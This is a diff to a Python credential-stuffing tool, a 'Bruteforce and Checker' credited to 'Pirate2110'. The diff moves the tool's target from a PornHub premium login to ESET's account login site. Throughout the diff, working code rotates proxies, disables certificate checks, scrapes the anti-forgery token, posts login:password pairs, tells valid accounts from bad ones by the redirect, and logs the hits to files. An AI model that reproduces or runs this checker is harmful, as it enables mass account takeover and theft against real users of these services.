@@ -15,8 +15,8 @@ requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
 
 class Brute(object):
     def __init__(self):
-        self.projectName = "PornHub"
-        self.projectFullName = "PornHub Bruteforce and Checker"
+        self.projectName = "Eset"
+        self.projectFullName = "Eset Bruteforce and Checker"
         self.description = "Author : Pirate2110"
         self.good = 0
         self.bad = 0 
@@ -39,36 +39,44 @@ class Brute(object):
 
     def check(self, login, password):
         try:
-            
             pr = self.getproxy()
             if self.proxytype != "burp":
                 proxies = {'https': self.proxytype +  "://" + pr, 'http': self.proxytype +  "://" + pr}
             else:
                 proxies = {'https': '127.0.0.1:8080', 'http': '127.0.0.1:8080'}
             
+            #print(proxies)
             headers = {'User-Agent' : 'Mozilla/5.0 (Linux; Android 6.0.1; Moto G (4)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Mobile Safari/537.36'}
             s = requests.session()
-            r = s.get("https://rt.pornhubpremium.com/premium/login", proxies=proxies, verify=False, timeout=self.timeout, headers=headers)
+            r = s.get("https://login.eset.com/Login/Index", proxies=proxies, verify=False, timeout=self.timeout, headers=headers)
             site = soup(r.text, "html.parser")
-            token = site.find("input", id="token")
-            body = {'username' : login, 'password': password, 'remember_me' : 'on', 'from':'mobile_login', 'token' : str(token['value']), 'redirect' : '', 'from' : 'pc_premium_login', 'segment':'straight'}
-            r = s.post("https://rt.pornhubpremium.com/front/authenticate", data=body, proxies=proxies, verify=False, timeout=self.timeout, headers=headers)
+            token = site.find("input", {"name":"__RequestVerificationToken"})['value']
+            url = site.find("input", {"name":"ReturnUrl"})['value']
+            body = "Email=" + login + "&Password=" + password + "&__RequestVerificationToken=" + token + "&ReturnUrl=" + url 
+            headers = {
+                'User-Agent' : 'Mozilla/5.0 (Linux; Android 6.0.1; Moto G (4)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Mobile Safari/537.36',
+                'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+                'Content-Type': 'application/x-www-form-urlencoded',
+                'Upgrade-Insecure-Requests': '1'
+            }
+            r = s.post("https://login.eset.com/Login/Login", data=body, proxies=proxies, verify=False, timeout=self.timeout, headers=headers, allow_redirects=False)
             
-
-            if "\u041d\u0435\u0432\u0435\u0440\u043d\u043e\u0435" in r.json()['message']:
-                self.bad += 1
-            elif r.json()['success'] == "1":
-                if "https://rt.pornhubpremium.com/premium_signup?type=PhP-Lander" in r.json()['redirect']:
-                    self.writelog("good.txt", login + ":" + password)
+            if "the service is not available" in r.text:
+                self.captcha += 1
+                self.lines.append(login+':'+password)
+            elif r.status_code == 302:
+                if "authorize" in r.headers['Location']:
+                    self.bad += 1
                 else:
-                    self.writelog("premium.txt", login + ":" + password + "|" + str(r.text))
-                self.good += 1
-                #return login + ":" + password + "|" + str(r.json()['result']['basic']) + "|" + str(r.json()['result']['bonus'])
-            
+                    self.writelog("projerr.txt", login + ":" + password + "|" + str(r.headers['Location']))
+                    self.projerror += 1
             else:
+                self.writelog("projerr.txt", login + ":" + password + "|" + str(r.headers['Location']))
                 self.projerror += 1
         except Exception as e:
-            #print("Error is " + str(e))
+            exc_type, exc_obj, exc_tb = sys.exc_info()
+            fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
+            #print(exc_type, fname, exc_tb.tb_lineno)
             self.error += 1
             self.lines.append(login+':'+password)
      
@@ -78,6 +86,8 @@ class Brute(object):
         sys.stdout.flush()
 
    
+
+
 
     def mult(self):
         
